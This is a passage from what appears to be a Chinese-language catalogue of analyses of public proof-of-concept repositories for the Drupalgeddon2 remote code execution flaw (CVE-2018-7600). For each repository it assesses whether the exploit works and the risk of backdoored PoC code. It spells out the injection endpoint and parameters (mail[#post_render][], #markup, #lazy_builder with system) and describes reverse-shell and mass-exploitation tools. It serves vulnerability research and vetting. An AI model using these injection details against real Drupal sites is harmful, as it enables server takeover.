提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

